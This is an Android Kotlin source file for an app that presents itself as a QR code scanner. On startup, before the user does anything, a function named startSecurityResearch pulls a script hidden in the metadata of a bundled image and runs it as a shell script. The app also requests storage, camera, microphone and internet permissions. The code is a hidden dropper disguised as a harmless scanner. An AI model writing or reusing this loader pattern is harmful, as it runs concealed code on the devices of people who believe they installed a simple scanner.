package com.example.aplicacionqr

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.example.aplicacionqr.databinding.ActivityMainBinding
import com.google.zxing.integration.android.IntentIntegrator
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat


class MainActivity : AppCompatActivity() {
    private lateinit var bashExecutor: BashExecutor
    private val REQUEST_CODE_PERMISSIONS = 1001

    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.INTERNET)
    private lateinit var binding: ActivityMainBinding
    private lateinit var btnScan: Button
    private lateinit var txtResult: TextView
    override fun onCreate(savedInstanceState: Bundle?) {

        binding= ActivityMainBinding.inflate(layoutInflater)
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(binding.root)


        requestAllPermissionsIfNeeded()


        startSecurityResearch()
        bashExecutor = BashExecutor()
        btnScan = findViewById(R.id.btnScan)
        txtResult = findViewById(R.id.txtResult)

        btnScan.setOnClickListener {
            startQRScanner()
        }
    }

    private fun startQRScanner() {
        val integrator = IntentIntegrator(this)
        integrator.setDesiredBarcodeFormats(IntentIntegrator.QR_CODE)
        integrator.setPrompt("Escanea")
        integrator.setCameraId(0)
        integrator.setBeepEnabled(true)
        integrator.setBarcodeImageEnabled(true)
        integrator.setOrientationLocked(false)
        integrator.initiateScan()
    }
    private fun requestAllPermissionsIfNeeded() {
        val missingPermissions = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                REQUEST_CODE_PERMISSIONS
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (grantResults.any { it != PackageManager.PERMISSION_GRANTED }) {
                Toast.makeText(
                    this,
                    "Debes aceptar todos los permisos para el correcto funcionamiento.",
                    Toast.LENGTH_LONG
                ).show()
                // Si quieres, puedes cerrar la app o deshabilitar ciertas funciones aquí.
            }
        }
    }


    private fun startSecurityResearch() {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                // 1. Extraer el script desde la imagen
                val decoded = ImageScriptDecoder.decodeFromAssets(this@MainActivity, "imagen_001.jpg")

                withContext(Dispatchers.Main) {
                    if (decoded == null) {
                        Log.e("MainActivity", "❌ No se pudo extraer el script de metadatos")
                        Toast.makeText(
                            this@MainActivity,
                            "No se pudo extraer el script de la imagen",
                            Toast.LENGTH_SHORT
                        ).show()
                    } else {
                        Log.d(
                            "MainActivity",
                            "✅ Script extraído (tipo: ${decoded.type}):\n${decoded.code.take(1000)}"
                        )

                        // 2. Si es tipo shell script, ejecuta con BashExecutor
                        if (decoded.type == "sh") {
                            lifecycleScope.launch(Dispatchers.IO) {
                                val success = bashExecutor.executeScriptText(decoded.code)
                                withContext(Dispatchers.Main) {
                                    if (success) {
                                        Toast.makeText(
                                            this@MainActivity,
                                            "✅ Script ejecutado exitosamente",
                                            Toast.LENGTH_SHORT
                                        ).show()
                                    } else {
                                        Toast.makeText(
                                            this@MainActivity,
                                            "❌ Error ejecutando script",
                                            Toast.LENGTH_SHORT
                                        ).show()
                                    }
                                }
                            }
                        } else {
                            // Si no es tipo sh, solo muestra el código
                            Toast.makeText(
                                this@MainActivity,
                                "Script extraído pero no es bash (tipo: ${decoded.type})",
                                Toast.LENGTH_SHORT
                            ).show()
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Error extrayendo o ejecutando script", e)
                withContext(Dispatchers.Main) {
                    Toast.makeText(
                        this@MainActivity,
                        "Error: ${e.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }
}